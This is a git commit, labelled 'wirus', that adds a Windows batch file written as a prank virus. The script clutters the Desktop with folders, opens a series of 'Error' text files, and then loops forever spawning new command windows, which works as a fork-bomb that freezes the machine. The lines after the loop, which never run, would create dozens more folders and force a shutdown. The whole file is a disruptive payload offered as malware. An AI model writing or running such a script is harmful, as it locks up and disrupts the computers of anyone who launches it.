594788691a2ce9749dbb003c1afc10beb24d5817
WexoYT <patrykwz9002@gmail.com>
2025-03-09 01:09:59 +0100

    wirus

---
+++ w.E.Xo_w-IR-u.bat
@@ -0,0 +1,102 @@
+@echo off
+cd pulpit
+mkdir w.E.Xo_w-IR-us
+cd w.E.Xo_w-IR-us
+mkdir made_by_Wexo
+mkdir Error
+cd C:\Users\patry\Desktop\w.E.Xo_w-IR-us\Error
+echo Error > error.txt
+start error.txt
+echo Error > error1.txt
+start error1.txt
+echo Error > error2.txt
+start error2.txt
+echo Error > error3.txt
+start error3.txt
+echo Error > error4.txt
+start error4.txt
+echo Error > error5.txt
+start error5.txt
+echo Error > error6.txt
+start error6.txt
+echo Error > error7.txt
+start error7.txt
+echo Error > error8.txt
+start error8.txt
+echo Error > error9.txt
+start error9.txt
+color 0A
+:loop
+start cmd /k "color 0A && :loop && echo && goto loop"
+goto loop
+cd pulpit
+mkdir w.E.Xo_w-IR-us1
+mkdir w.E.Xo_w-IR-us2
+mkdir w.E.Xo_w-IR-us3
+mkdir w.E.Xo_w-IR-us4
+mkdir w.E.Xo_w-IR-us5
+mkdir w.E.Xo_w-IR-us6
+mkdir w.E.Xo_w-IR-us7
+mkdir w.E.Xo_w-IR-us8
+mkdir w.E.Xo_w-IR-us9
+mkdir w.E.Xo_w-IR-us10
+mkdir w.E.Xo_w-IR-us11
+mkdir w.E.Xo_w-IR-us12
+mkdir w.E.Xo_w-IR-us13
+mkdir w.E.Xo_w-IR-us14
+mkdir w.E.Xo_w-IR-us15
+mkdir w.E.Xo_w-IR-us16
+mkdir w.E.Xo_w-IR-us17
+mkdir w.E.Xo_w-IR-us18
+mkdir w.E.Xo_w-IR-us19
+mkdir w.E.Xo_w-IR-us20
+mkdir w.E.Xo_w-IR-us21
+mkdir w.E.Xo_w-IR-us22
+mkdir w.E.Xo_w-IR-us23
+mkdir w.E.Xo_w-IR-us24
+mkdir w.E.Xo_w-IR-us25
+mkdir w.E.Xo_w-IR-us26
+mkdir w.E.Xo_w-IR-us27
+mkdir w.E.Xo_w-IR-us28
+mkdir w.E.Xo_w-IR-us29
+mkdir w.E.Xo_w-IR-us30
+mkdir w.E.Xo_w-IR-us31
+mkdir w.E.Xo_w-IR-us32
+mkdir w.E.Xo_w-IR-us33
+mkdir w.E.Xo_w-IR-us34
+mkdir w.E.Xo_w-IR-us35
+mkdir w.E.Xo_w-IR-us36
+mkdir w.E.Xo_w-IR-us37
+mkdir w.E.Xo_w-IR-us38
+mkdir w.E.Xo_w-IR-us39
+mkdir w.E.Xo_w-IR-us40
+mkdir w.E.Xo_w-IR-us41
+mkdir w.E.Xo_w-IR-us42
+mkdir w.E.Xo_w-IR-us43
+mkdir w.E.Xo_w-IR-us44
+mkdir w.E.Xo_w-IR-us45
+mkdir w.E.Xo_w-IR-us46
+mkdir w.E.Xo_w-IR-us47
+mkdir w.E.Xo_w-IR-us48
+mkdir w.E.Xo_w-IR-us49
+mkdir w.E.Xo_w-IR-us50
+mkdir w.E.Xo_w-IR-us51
+mkdir w.E.Xo_w-IR-us52
+mkdir w.E.Xo_w-IR-us53
+mkdir w.E.Xo_w-IR-us54
+mkdir w.E.Xo_w-IR-us55
+mkdir w.E.Xo_w-IR-us56
+mkdir w.E.Xo_w-IR-us57
+mkdir w.E.Xo_w-IR-us58
+mkdir w.E.Xo_w-IR-us59
+mkdir w.E.Xo_w-IR-us60
+mkdir w.E.Xo_w-IR-us61
+mkdir w.E.Xo_w-IR-us62
+mkdir w.E.Xo_w-IR-us63
+mkdir w.E.Xo_w-IR-us64
+mkdir w.E.Xo_w-IR-us65
+mkdir w.E.Xo_w-IR-us66
+mkdir w.E.Xo_w-IR-us67
+mkdir w.E.Xo_w-IR-us68
+mkdir w.E.Xo_w-IR-us69
+shutdown /s /t 60
